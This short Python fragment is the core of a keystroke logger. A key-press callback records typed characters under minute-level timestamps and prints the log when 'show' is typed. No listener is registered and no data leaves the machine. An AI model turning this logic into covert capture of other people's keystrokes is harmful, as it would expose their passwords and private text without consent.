from datetime import datetime

dicti = {}
dicti_for_show = ''

def on_key_press(key):
    global dicti,dicti_for_show
    key = str(key)[14:-6]
    currentTime = datetime.now().strftime('%d/%m/%y %H:%M')

    if currentTime not in dicti:
        dicti[currentTime] = ''

    dicti[currentTime] += key
    dicti_for_show += key

    if "show" in dicti_for_show:
        for k,v in dicti.items():
            print()
            print(k)
            print(v)
            print()
        dicti = {}
        dicti_for_show = ''



